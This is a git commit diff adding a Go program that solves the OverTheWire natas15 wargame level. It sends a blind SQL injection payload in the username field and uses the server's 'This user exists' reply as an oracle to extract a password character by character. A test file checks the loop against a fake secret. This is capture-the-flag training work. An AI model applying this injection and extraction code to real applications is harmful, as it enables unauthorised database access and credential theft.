4db12ab0e6e5905ce850ad882100edcf3aa9c65e
Paul Hadfield <hadfieldp@google.com>
2017-10-18 17:58:49 +0100

    Use a SQL injection attack to get a natas15 password oracle

--- natas15/crack.go
+++ natas15/crack.go
@@ -1,10 +1,100 @@
-// crack is a little program to discover a base64-encoded password using an oracle in the natas15 challenge page
+// natas15 is a little program to discover a base64-encoded password using an oracle in the natas15 challenge page
 package main
 
 import (
+	"errors"
 	"fmt"
+	"io/ioutil"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
 )
 
+const (
+	// Stolen from golang.org/src/encoding/base64/base64.go as it is not exported
+	b64Std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+)
+
+var (
+	numHTTPReqs = 0
+)
+
+type oracleFn func(try string, pos int) (bool, error)
+
+func crackEq(oraFn oracleFn, secretLen int) (string, error) {
+	var gotSoFar, candidate string
+	for i := 0; i < secretLen; i++ {
+		for j := 0; j < len(b64Std); j++ {
+			candidate = b64Std[j:j+1]
+			eq, err := oraFn(gotSoFar + candidate, i)
+			if err != nil {
+				return "", err
+			}
+			if eq {
+				fmt.Printf(".")
+				gotSoFar += candidate
+				break
+			}
+		}
+		if len(gotSoFar) == secretLen {
+			fmt.Printf("✔")
+			return gotSoFar, nil
+		}
+	}
+	fmt.Printf("❌")
+	return "", errors.New("failed to crack the secret :(")
+}
+
+func natasSQLInjectionOracle(try string, pos int) (bool, error) {
+	// Make HTTP request.  We specify:
+	// - user/pass to access the natas15 challenge
+	// - 'username' guess via which we perform the SQL injection
+
+	// We then check the response for the presence of a particular string:
+	// 'This user exists'.
+
+	// SQL executed by the server-side PHP is:
+	// $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+
+	// We can inject a second condition to check the 'password' field of the 'users' table:
+	// SELECT * from users where username="natas16" and substr(password, 0, n)="guess"
+
+	query := fmt.Sprintf(`natas16" and SUBSTR(password COLLATE latin1_bin, 1, %d) = "%s`, pos+1, try)
+
+	data := make(url.Values)
+	data.Set("username", query)
+	body := data.Encode()
+
+	req, err := http.NewRequest("POST", "http://natas15.natas.labs.overthewire.org/index.php", strings.NewReader(body))
+	if err != nil {
+		return false, err
+	}
+	req.SetBasicAuth("natas15", "<redacted>")  // Complete challenge 14 first! :)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return false, err
+	}
+	numHTTPReqs++
+	defer resp.Body.Close()
+
+	b, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, err
+	}
+
+	found := strings.Contains(string(b), "This user exists")
+	return found, nil
+}
+
 func main() {
-	fmt.Println("Hello, playground")
+	fmt.Println("NaTaS15_cRaCx\n\n")
+	cracked, err := crackEq(natasSQLInjectionOracle, 32)
+	if err != nil {
+		fmt.Println("Sadly we failed :(")
+		os.Exit(1)
+	}
+	fmt.Printf("\n\nAfter %d HTTP requests, the password is [%v]\n", numHTTPReqs, cracked)
 }
--- natas15/crack_test.go
+++ natas15/crack_test.go
@@ -1,8 +1,25 @@
 package main
 
 import (
+	"fmt"
 	"testing"
 )
 
-func TestCrack(t *testing.T) {
+const secret = "JkhsDF67asz+nj/DFNuasAS64rwsdayu"
+
+func oracleEq(try string, pos int) (bool, error) {
+	if pos < 0 || pos > len(secret) {
+		panic(fmt.Sprintf("pos out of range, want 0 <= pos < 32", pos))
+	}
+	return try[0:pos+1] == secret[0:pos+1], nil
+}
+
+func TestCrackEq(t *testing.T) {
+	cracked, err := crackEq(oracleEq, 32)
+	if err != nil {
+		t.Errorf("Should have been cracked; got %v", err)
+	}
+	if cracked != secret {
+		t.Errorf("Cracked OK but wrong answer. got %v want %v", cracked, secret)
+	}
 }
